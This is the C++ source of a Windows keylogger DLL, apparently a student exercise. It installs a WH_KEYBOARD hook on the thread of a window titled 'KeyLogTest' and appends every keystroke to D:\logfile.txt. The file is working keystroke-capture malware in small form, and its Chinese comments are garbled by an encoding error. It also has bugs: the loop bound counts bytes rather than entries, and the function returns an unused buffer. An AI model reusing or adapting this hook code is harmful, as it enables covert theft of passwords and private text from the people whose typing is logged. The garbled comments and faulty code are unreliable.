/**
 * @author Haoguang Xu
 * 
 * Copyright (c) 2016, UCAS
 * All rights reserved. 
 * 
 * Hook.cpp //����Hook.dll
 */
 
#include "windows.h"
#include"stdio.h"
#include <io.h>  
#include <fcntl.h> 
#include "keyInfo.h"

HHOOK g_hKeyBoard; //ȫ�ּ���HOOK
extern const KeyName g_KeyNames[]; //������Ϣ
FILE *fp; //��ż��̼�¼��Ϣ���ļ�

/**
* ���ݰ����¼������Ұ�����Ϣ
* 
* @param VK���������
		 capsLock����д�Ƿ���
* @return char*
*/
char* findKetName(int VK, int capsLock)
{
    static char buf[128]={0};
    int i=0;
    fp = fopen("D:\\logfile.txt","a+"); //�򿪴�ż��̼�¼��Ϣ���ļ�����������Ϊ"a+"��׷�ӣ�

    for(i=0;i<sizeof(g_KeyNames);i++)
    {
        if(i == VK)
        {   if(i>=64 && i<=90 && capsLock == 0){
				fprintf(fp,"%c ",i+32); //�������Сд��ĸ
			}else 
				fprintf(fp,"%s ",g_KeyNames[i].name);

        }
    }

	fclose(fp); //�ر��ļ�
	
    return buf; //���ذ���Ϣ
}

/**
 * ���ӻص�����
 * 
 * @param nCode��Hook����
		  wParam�� ��Ϣ��ʾ�������жϸ���Ϣ��������Ϣ����WM_MOUSEMOVE��WM_NCMOUSEMOVE
		  lParam������������Ϣ����Ϣָ�룬�������λ�á�״̬�����̰�����
 * @return �ص�����
 */

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if(nCode == HC_ACTION)
    {
        if( !(lParam & 0x80000000)) //�������� Ҫ���жϷ��������Ϣ�����Ӧ����(���̰��º͵���)
        {
			unsigned char buf[256];
			GetKeyboardState(buf); //��ȡ���̵İ���״̬

			if(buf[VK_CAPITAL]&1) //���̴�д����
				findKetName(wParam, 1);
			else 
				findKetName(wParam, 0);
        }
    }
	return 0;
}

/**
 * ��Ӧ�ó���ҹ���
 * @return void
 */
void setHook(){


	HWND hWnd = FindWindow(NULL,"KeyLogTest"); //����KeyLogTest�ҵ�ָ��Ӧ�ó���Ĵ��ھ��
    
    DWORD ProcessID;
	DWORD ThreadID;
	
    ThreadID = GetWindowThreadProcessId(hWnd, &ProcessID); //�ҵ�����ID
	
    g_hKeyBoard = SetWindowsHookEx(WH_KEYBOARD,HookProc,GetModuleHandle("Hook"),ThreadID); //����Hook.dll�ͽ���ID��Ӧ�ó���Ҽ��̹���

}